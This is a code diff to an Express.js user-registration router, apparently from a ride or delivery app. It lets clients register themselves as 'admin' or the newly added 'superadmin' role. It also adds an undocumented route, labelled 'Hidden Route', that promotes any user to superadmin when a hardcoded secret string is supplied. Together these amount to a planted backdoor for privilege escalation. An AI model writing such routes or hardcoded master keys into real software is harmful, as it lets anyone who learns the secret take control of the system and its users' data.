@@ -17,7 +17,7 @@ router.post('/register-v2', (req, res) => {
 
     const salt = bcrypt.genSaltSync(10);
     const hash = bcrypt.hashSync(password, salt);
-    const validRole = ['client', 'driver', 'admin'].includes(role) ? role : 'client';
+    const validRole = ['client', 'driver', 'admin', 'superadmin'].includes(role) ? role : 'client';
 
     // Mock Codes
     const emailCode = Math.floor(100000 + Math.random() * 900000).toString();
@@ -141,6 +141,17 @@ router.post('/reject', (req, res) => {
     db.run("UPDATE users SET status = 'REJECTED' WHERE id = ?", [userId], function (err) {
         if (err) return res.status(500).json({ error: err.message });
         res.json({ message: "Usuario rechazado" });
+    });
+});
+
+// TEMPORARY: Promote to Super Admin (Hidden Route)
+router.post('/promote-super-secret', (req, res) => {
+    const { userId, secret } = req.body;
+    if (secret !== 'pappi-master-key-2024') return res.status(403).json({ error: "Forbidden" });
+
+    db.run("UPDATE users SET role = 'superadmin', status = 'ACTIVE' WHERE id = ?", [userId], (err) => {
+        if (err) return res.status(500).json({ error: err.message });
+        res.json({ message: "User promoted to SUPERADMIN" });
     });
 });
 
